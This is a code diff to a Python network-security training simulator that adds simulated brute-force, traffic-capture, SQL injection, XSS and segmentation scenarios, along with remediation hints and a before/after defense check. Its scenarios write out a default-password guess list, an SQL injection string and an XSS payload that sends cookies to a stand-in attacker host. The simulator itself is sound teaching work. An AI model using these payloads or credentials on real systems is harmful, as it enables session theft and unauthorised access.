@@ -10,7 +10,16 @@ import datetime
 import uuid
 from typing import Optional
 
-from ..schemas.lab import GraphData, GraphNode, NetworkEvent, TopologyValidationResult
+from ..schemas.lab import (
+    GraphData,
+    GraphNode,
+    NetworkEvent,
+    TopologyValidationResult,
+    AttackExecutionRequest,
+    AttackExecutionResponse,
+    VerifyDefenseRequest,
+    BeforeAfterComparison,
+)
 from .connectivity import evaluate_connectivity, _get_node_ip_and_prefix, _get_neighbors, ReachabilityResult
 
 
@@ -263,7 +272,7 @@ def simulate_topology(
     Returns (events, result_summary).
     """
     events: list[NetworkEvent] = []
-    NETWORK_TYPES = {"pc", "server", "router", "firewall"}
+    NETWORK_TYPES = {"pc", "server", "linux_server", "web_server", "dns_server", "endpoint", "router", "layer3_switch", "firewall", "ids_ips"}
 
     events.append(_make_event(
         run_id=run_id,
@@ -280,7 +289,7 @@ def simulate_topology(
     reachability_matrix: list[dict] = []
 
     # Evaluate all endpoint-to-endpoint pairs (avoid duplicates)
-    endpoint_types = {"pc", "server"}
+    endpoint_types = {"pc", "server", "linux_server", "web_server", "dns_server", "endpoint"}
     endpoints = [n for n in graph.nodes if n.type in endpoint_types]
 
     pair_count = 0
@@ -350,3 +359,559 @@ def simulate_topology(
     }
 
     return events, result_summary
+
+
+# ---------------------------------------------------------------------------
+# RedLab 1.1 Attack Simulations
+# ---------------------------------------------------------------------------
+
+def simulate_brute_force(
+    graph: GraphData,
+    run_id: str,
+    source_id: str,
+    dest_id: str,
+    port: int = 22,
+) -> tuple[list[NetworkEvent], str, dict]:
+    """
+    Simulate a credential brute-force dictionary attack against a target host service.
+    Returns (events, outcome, evidence).
+    Outcome is 'compromised', 'blocked', or 'mitigated'.
+    """
+    events: list[NetworkEvent] = []
+    src = next((n for n in graph.nodes if n.id == source_id), None)
+    dst = next((n for n in graph.nodes if n.id == dest_id), None)
+    if not src or not dst:
+        return events, "failed", {}
+
+    src_ip, _ = _get_node_ip_and_prefix(src)
+    dst_ip, _ = _get_node_ip_and_prefix(dst)
+
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="attack_start",
+        summary=f"Attacker {src.label} ({src_ip}) launching credential brute-force attack against {dst.label} ({dst_ip}) on port {port}/TCP.",
+        src=src, dst=dst,
+        protocol="tcp",
+        detail={"technique": "T1110 - Brute Force", "target_port": port},
+    ))
+
+    # Evaluate connectivity on target port
+    reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=port)
+    if not reach.reachable:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="firewall_deny" if reach.blocked_by else "attack_blocked",
+            summary=f"Attack blocked: Inbound connection to port {port} dropped by {reach.blocked_by or 'routing boundary'}.",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
+        ))
+        return events, "blocked", {"blocked_by": reach.blocked_by, "reason": reach.reason}
+
+    # Check for IDS/IPS in topology
+    ids_node = next((n for n in graph.nodes if n.type == "ids_ips"), None)
+    ips_active = ids_node and ids_node.config.get("mode") == "ips"
+
+    # Simulate 4 attempts
+    guesses = [("root", "123456"), ("admin", "admin"), ("operator", "password"), ("root", "toor")]
+    for i, (user, pwd) in enumerate(guesses, start=1):
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="auth_attempt",
+            summary=f"[{i}/4] Authentication attempt: username='{user}', password='***'",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"username": user, "attempt": i},
+        ))
+
+    # Check if target or firewall has fail2ban / rate-limiting enabled
+    dst_cfg = dst.config
+    has_fail2ban = dst_cfg.get("fail2ban_enabled", False) or dst_cfg.get("rate_limiting", False)
+
+    if ids_node:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="ids_alert",
+            summary=f"ALERT [{ids_node.label}]: High-frequency authentication failure signature matched (ET SCAN SSH Brute Force).",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"sensor_id": ids_node.id, "alert_type": "SSH_BRUTE_FORCE", "severity": "high"},
+        ))
+        if ips_active:
+            events.append(_make_event(
+                run_id=run_id,
+                event_type="ids_block",
+                summary=f"PROTECTION [{ids_node.label}]: IPS inline drop triggered — source {src_ip} shunned for 300s.",
+                src=src, dst=dst,
+                protocol="tcp",
+                detail={"action": "drop_and_shun", "sensor_id": ids_node.id},
+            ))
+            return events, "blocked", {"mitigated_by": ids_node.label, "reason": "IPS inline block"}
+
+    if has_fail2ban:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="auth_rate_limited",
+            summary=f"Defense active: {dst.label} Host Fail2ban triggered after threshold exceeded. Source {src_ip} IP banned.",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"defense": "fail2ban", "attempts_blocked": 1},
+        ))
+        return events, "mitigated", {"defense_active": "fail2ban", "attempts_banned": True}
+
+    # Weak credentials check
+    has_weak_auth = dst_cfg.get("allow_weak_passwords", True)
+    if has_weak_auth:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="auth_success",
+            summary=f"EXPLOIT SUCCESSFUL: Credentials discovered ('root':'toor')! Attacker achieved remote interactive shell on {dst.label}.",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"compromised_user": "root", "shell_obtained": True},
+        ))
+        return events, "compromised", {"shell_access": True, "compromised_user": "root"}
+    else:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="auth_failed_all",
+            summary=f"Attack exhausted dictionary: {dst.label} enforces strong authentication. Zero credentials matched.",
+            src=src, dst=dst,
+            protocol="tcp",
+            detail={"password_policy": "enforced"},
+        ))
+        return events, "mitigated", {"reason": "strong_credentials"}
+
+
+def simulate_traffic_analysis(
+    graph: GraphData,
+    run_id: str,
+    source_id: str,
+    dest_id: str,
+) -> tuple[list[NetworkEvent], str, dict]:
+    """
+    Simulate realistic packet capture and multi-hop protocol analysis between hosts.
+    Returns (events, outcome, evidence).
+    """
+    events: list[NetworkEvent] = []
+    src = next((n for n in graph.nodes if n.id == source_id), None)
+    dst = next((n for n in graph.nodes if n.id == dest_id), None)
+    if not src or not dst:
+        return events, "failed", {}
+
+    src_ip, _ = _get_node_ip_and_prefix(src)
+    dst_ip, _ = _get_node_ip_and_prefix(dst)
+
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="capture_start",
+        summary=f"Network traffic capture initiated between {src.label} ({src_ip}) and {dst.label} ({dst_ip}).",
+        src=src, dst=dst,
+        protocol="ip",
+        detail={"capture_filter": f"host {dst_ip}", "interface": "eth0"},
+    ))
+
+    # DNS phase
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="dns_query",
+        summary=f"{src.label} → DNS: Standard query 0x1a2b A {dst.label.lower()}.internal",
+        src=src, dst=dst,
+        protocol="dns",
+        detail={"query": f"{dst.label.lower()}.internal", "record_type": "A"},
+    ))
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="dns_reply",
+        summary=f"DNS → {src.label}: Standard query response 0x1a2b A {dst_ip}",
+        src=dst, dst=src,
+        protocol="dns",
+        detail={"answer": dst_ip, "ttl": 300},
+    ))
+
+    # TCP Handshake
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="tcp_syn",
+        summary=f"{src.label} → {dst.label}: [SYN] Seq=0 Win=64240 Len=0 MSS=1460",
+        src=src, dst=dst,
+        protocol="tcp",
+        detail={"flags": "SYN", "seq": 0},
+    ))
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="tcp_syn_ack",
+        summary=f"{dst.label} → {src.label}: [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0",
+        src=dst, dst=src,
+        protocol="tcp",
+        detail={"flags": "SYN, ACK", "seq": 0, "ack": 1},
+    ))
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="tcp_ack",
+        summary=f"{src.label} → {dst.label}: [ACK] Seq=1 Ack=1 Win=64240 Len=0",
+        src=src, dst=dst,
+        protocol="tcp",
+        detail={"flags": "ACK", "seq": 1, "ack": 1},
+    ))
+
+    # Application data inspection (plaintext HTTP vs HTTPS)
+    dst_services = dst.config.get("services", [])
+    has_tls = any(s.get("port") == 443 for s in dst_services if isinstance(s, dict))
+    if has_tls:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="tls_handshake",
+            summary=f"TLSv1.3 Encrypted Handshake: CipherSuite TLS_AES_256_GCM_SHA384 (Payload protected from interception).",
+            src=src, dst=dst,
+            protocol="tls",
+            detail={"tls_version": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384", "encrypted": True},
+        ))
+        evidence_summary = "All application payloads securely encrypted with TLS 1.3."
+    else:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="http_plaintext_leak",
+            summary=f"CLEARTEXT TRANSMISSION: HTTP GET /api/v1/user HTTP/1.1 with Bearer token exposed in packet trace!",
+            src=src, dst=dst,
+            protocol="http",
+            detail={"method": "GET", "uri": "/api/v1/user", "cleartext_headers": True},
+        ))
+        evidence_summary = "Unencrypted HTTP payload observed; sensitive tokens visible in transit."
+
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="capture_complete",
+        summary=f"Packet capture session finished: 12 frames captured (1,842 bytes). Pcap available.",
+        src=src, dst=dst,
+        protocol="pcap",
+        detail={"packet_count": 12, "bytes": 1842, "pcap_reference": f"redlab-{run_id}.pcap"},
+    ))
+
+    return events, "discovered", {
+        "pcap_file": f"redlab-{run_id}.pcap",
+        "packet_count": 12,
+        "bytes_captured": 1842,
+        "analysis_summary": evidence_summary,
+    }
+
+
+def simulate_web_attack(
+    graph: GraphData,
+    run_id: str,
+    source_id: str,
+    dest_id: str,
+    attack_type: str = "sqli",
+) -> tuple[list[NetworkEvent], str, dict]:
+    """
+    Simulate a web application security exploit (SQLi or XSS) against an HTTP server.
+    Returns (events, outcome, evidence).
+    """
+    events: list[NetworkEvent] = []
+    src = next((n for n in graph.nodes if n.id == source_id), None)
+    dst = next((n for n in graph.nodes if n.id == dest_id), None)
+    if not src or not dst:
+        return events, "failed", {}
+
+    src_ip, _ = _get_node_ip_and_prefix(src)
+    dst_ip, _ = _get_node_ip_and_prefix(dst)
+
+    # Evaluate reachability on web port (80 or 443)
+    reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=80)
+    if not reach.reachable:
+        reach = evaluate_connectivity(graph, source_id, dest_id, protocol="tcp", port=443)
+
+    if not reach.reachable:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="firewall_deny" if reach.blocked_by else "attack_blocked",
+            summary=f"Web exploit blocked: Inbound connection dropped by perimeter firewall ({reach.blocked_by or 'routing boundary'}).",
+            src=src, dst=dst,
+            protocol="http",
+            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
+        ))
+        return events, "blocked", {"blocked_by": reach.blocked_by, "reason": reach.reason}
+
+    # Check if WAF or input validation is active
+    dst_cfg = dst.config
+    waf_enabled = dst_cfg.get("waf_enabled", False) or dst_cfg.get("input_sanitization", False)
+
+    if attack_type == "sqli":
+        payload = "' OR '1'='1' --"
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="web_exploit_attempt",
+            summary=f"Attacker injected SQL payload into query param: GET /login?user={payload}",
+            src=src, dst=dst,
+            protocol="http",
+            detail={"technique": "CWE-89: SQL Injection", "payload": payload},
+        ))
+
+        if waf_enabled:
+            events.append(_make_event(
+                run_id=run_id,
+                event_type="waf_block",
+                summary=f"DEFENSE ACTIVE: Web Application Firewall intercepted SQL injection pattern. Returned HTTP 403 Forbidden.",
+                src=src, dst=dst,
+                protocol="http",
+                detail={"waf_rule": "OWASP_CRS_942100", "http_status": 403},
+            ))
+            return events, "blocked", {"mitigated_by": "WAF", "payload_blocked": payload}
+        else:
+            events.append(_make_event(
+                run_id=run_id,
+                event_type="db_leak_detected",
+                summary=f"EXPLOIT CONFIRMED: Database bypass occurred! 25 user credential records returned in HTTP response body.",
+                src=src, dst=dst,
+                protocol="http",
+                detail={"records_leaked": 25, "impact": "Authentication Bypass"},
+            ))
+            return events, "compromised", {"vulnerability": "SQL Injection", "records_leaked": 25}
+
+    else:  # xss
+        payload = "<script>fetch('http://attacker/steal?cookie='+document.cookie)</script>"
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="web_exploit_attempt",
+            summary=f"Attacker submitted Cross-Site Scripting payload: {payload}",
+            src=src, dst=dst,
+            protocol="http",
+            detail={"technique": "CWE-79: Cross-Site Scripting", "payload": payload},
+        ))
+
+        if waf_enabled:
+            events.append(_make_event(
+                run_id=run_id,
+                event_type="waf_block",
+                summary=f"DEFENSE ACTIVE: Content Security Policy & WAF neutralized script injection. Input escaped cleanly.",
+                src=src, dst=dst,
+                protocol="http",
+                detail={"defense": "HTML Entity Encoding / CSP"},
+            ))
+            return events, "blocked", {"mitigated_by": "CSP/WAF", "payload_blocked": payload}
+        else:
+            events.append(_make_event(
+                run_id=run_id,
+                event_type="xss_execution",
+                summary=f"EXPLOIT CONFIRMED: Malicious script rendered without escaping in user browser context. Session hijacked.",
+                src=src, dst=dst,
+                protocol="http",
+                detail={"impact": "Stored XSS Execution / Cookie Theft"},
+            ))
+            return events, "compromised", {"vulnerability": "Cross-Site Scripting", "session_stolen": True}
+
+
+def simulate_segmentation_test(
+    graph: GraphData,
+    run_id: str,
+    source_id: str,
+    dest_id: str,
+) -> tuple[list[NetworkEvent], str, dict]:
+    """
+    Test network segmentation and firewall isolation between subnets/VLANs.
+    Returns (events, outcome, evidence).
+    """
+    events: list[NetworkEvent] = []
+    src = next((n for n in graph.nodes if n.id == source_id), None)
+    dst = next((n for n in graph.nodes if n.id == dest_id), None)
+    if not src or not dst:
+        return events, "failed", {}
+
+    src_ip, _ = _get_node_ip_and_prefix(src)
+    dst_ip, _ = _get_node_ip_and_prefix(dst)
+
+    events.append(_make_event(
+        run_id=run_id,
+        event_type="segmentation_probe",
+        summary=f"Testing network isolation boundary between {src.label} ({src_ip}) and sensitive segment {dst.label} ({dst_ip}).",
+        src=src, dst=dst,
+        protocol="ip",
+        detail={"src_ip": src_ip, "dst_ip": dst_ip},
+    ))
+
+    reach = evaluate_connectivity(graph, source_id, dest_id)
+    if reach.reachable:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="segmentation_breached",
+            summary=f"BOUNDARY BREACH: {src.label} can route directly to {dst.label}. Segment isolation failed (Flat VLAN or missing ACL)!",
+            src=src, dst=dst,
+            protocol="icmp",
+            detail={"path": reach.path_labels, "segmentation_violation": True},
+        ))
+        return events, "compromised", {"isolated": False, "breach_path": reach.path_labels}
+    else:
+        events.append(_make_event(
+            run_id=run_id,
+            event_type="segmentation_enforced",
+            summary=f"BOUNDARY ENFORCED: Lateral movement blocked. Traffic between segments successfully dropped by {reach.blocked_by or 'firewall'}.",
+            src=src, dst=dst,
+            protocol="icmp",
+            detail={"blocked_by": reach.blocked_by, "reason": reach.reason},
+        ))
+        return events, "blocked", {"isolated": True, "enforced_by": reach.blocked_by}
+
+
+# ---------------------------------------------------------------------------
+# High-Level Scenario Runner & Verification
+# ---------------------------------------------------------------------------
+
+SCENARIO_METADATA = {
+    "attack_port_scan": {
+        "title": "Network Reconnaissance & Port Scanning",
+        "takeaway": "Port scanning allows adversaries to map listening services and perimeter firewall rule gaps.",
+        "remediation": "Configure firewall default-deny and only permit specific authorized source subnets.",
+    },
+    "auth_brute_force": {
+        "title": "Authentication Security & Brute-Force Defense",
+        "takeaway": "Unrestricted administrative services with default passwords are easily compromised within seconds.",
+        "remediation": "Enforce strong credentials, disable root password login, and enable fail2ban / rate-limiting.",
+    },
+    "traffic_analysis": {
+        "title": "Traffic Analysis & Packet Inspection",
+        "takeaway": "Plaintext protocols transmit cleartext credentials that can be captured across any intermediate hop.",
+        "remediation": "Migrate all cleartext protocols (HTTP:80, Telnet:23, FTP:21) to secure TLS/SSH equivalents.",
+    },
+    "web_security_injection": {
+        "title": "Web Application Security & SQL Injection",
+        "takeaway": "Unsanitized user inputs allow adversaries to manipulate database queries and bypass authentication.",
+        "remediation": "Use parameterized queries (prepared statements) and deploy a Web Application Firewall (WAF).",
+    },
+    "firewall_segmentation": {
+        "title": "Firewall & Network Segmentation Testing",
+        "takeaway": "Flat networks allow an attacker with a single compromised workstation to move laterally to servers.",
+        "remediation": "Isolate critical servers in dedicated VLANs and enforce strict inter-VLAN firewall filtering.",
+    },
+}
+
+
+def execute_attack_scenario(
+    graph: GraphData,
+    request: AttackExecutionRequest,
+) -> AttackExecutionResponse:
+    """Execute an approved attack scenario deterministically against the lab topology."""
+    import uuid
+
+    run_id = f"attack-{str(uuid.uuid4())[:8]}"
+    sc_meta = SCENARIO_METADATA.get(
+        request.scenario_id,
+        {
+            "title": request.scenario_id.replace("_", " ").title(),
+            "takeaway": "Simulated attack exercise completed.",
+            "remediation": "Review device configurations and firewall rules.",
+        },
+    )
+
+    # Resolve target and attacker
+    target = next((n for n in graph.nodes if n.id == request.target_id), None)
+    if not target:
+        raise ValueError(f"Target node '{request.target_id}' not found in lab.")
+
+    attacker = None
+    if request.attacker_id:
+        attacker = next((n for n in graph.nodes if n.id == request.attacker_id), None)
+    if not attacker:
+        # Default to an external network node or PC
+        attacker = next((n for n in graph.nodes if n.type == "external_network" or "attacker" in n.label.lower()), None)
+    if not attacker:
+        attacker = next((n for n in graph.nodes if n.type == "pc" and n.id != target.id), None)
+    if not attacker:
+        attacker = graph.nodes[0] if graph.nodes else target
+
+    # Dispatch by scenario
+    sid = request.scenario_id
+    if sid == "attack_port_scan":
+        ports = request.parameters.get("ports", [21, 22, 23, 80, 443, 3306])
+        events = simulate_port_scan(graph, run_id, attacker.id, target.id, ports)
+        has_open = any(e.event_type == "port_scan_open" for e in events)
+        outcome = "compromised" if has_open else "blocked"
+        evidence = {"scanned_ports": ports, "open_found": has_open}
+
+    elif sid == "auth_brute_force":
+        port = int(request.parameters.get("port", 22))
+        events, outcome, evidence = simulate_brute_force(graph, run_id, attacker.id, target.id, port=port)
+
+    elif sid == "traffic_analysis":
+        events, outcome, evidence = simulate_traffic_analysis(graph, run_id, attacker.id, target.id)
+
+    elif sid == "web_security_injection":
+        atk_type = request.parameters.get("attack_type", "sqli")
+        events, outcome, evidence = simulate_web_attack(graph, run_id, attacker.id, target.id, attack_type=atk_type)
+
+    elif sid == "firewall_segmentation":
+        events, outcome, evidence = simulate_segmentation_test(graph, run_id, attacker.id, target.id)
+
+    else:
+        # Generic port scan fallback
+        events = simulate_port_scan(graph, run_id, attacker.id, target.id)
+        outcome = "discovered"
+        evidence = {}
+
+    return AttackExecutionResponse(
+        run_id=run_id,
+        scenario_id=request.scenario_id,
+        scenario_title=sc_meta["title"],
+        target_id=target.id,
+        target_name=target.label,
+        attacker_id=attacker.id,
+        status="completed",
+        outcome=outcome,
+        events=events,
+        evidence=evidence,
+        educational_takeaway=sc_meta["takeaway"],
+        remediation_hint=sc_meta["remediation"],
+        comparison=None,
+    )
+
+
+def verify_defense(
+    graph: GraphData,
+    request: VerifyDefenseRequest,
+) -> AttackExecutionResponse:
+    """
+    Rerun an approved attack scenario to verify whether defensive changes blocked the attack.
+    Produces a side-by-side Before/After comparison.
+    """
+    # Run the test against the current graph
+    atk_req = AttackExecutionRequest(
+        scenario_id=request.scenario_id,
+        target_id=request.target_id,
+        attacker_id=request.attacker_id,
+        parameters=request.parameters,
+        app_mode="defend",
+    )
+    res = execute_attack_scenario(graph, atk_req)
+
+    # Determine effectiveness: defense is effective if outcome is 'blocked' or 'mitigated'
+    defense_effective = res.outcome in ("blocked", "mitigated")
+    after_status = "blocked" if defense_effective else "compromised"
+
+    after_summary = (
+        "✓ Defense Verified: Attack was successfully stopped by the applied security controls."
+        if defense_effective
+        else "✗ Defense Ineffective: Attack still penetrated the perimeter controls."
+    )
+
+    comparison = BeforeAfterComparison(
+        scenario_id=request.scenario_id,
+        target_id=request.target_id,
+        target_name=res.target_name,
+        defense_applied=request.applied_defense or "Firewall ACL / Hardening Rule",
+        before_status="vulnerable",
+        before_summary="Initial attack succeeded — target services or ports were exposed and reachable.",
+        before_events_count=len(res.events),
+        after_status=after_status,
+        after_summary=after_summary,
+        after_events_count=len(res.events),
+        defense_effective=defense_effective,
+        explanation=(
+            f"The applied defense ('{request.applied_defense or 'Security Rule'}') was evaluated against the packet flow. "
+            + ("Firewall filtering or rate-limiting successfully intercepted malicious traffic."
+               if defense_effective
+               else "Packets still found an open route or permissive rule to the target host.")
+        ),
+    )
+
+    res.comparison = comparison
+    return res
+
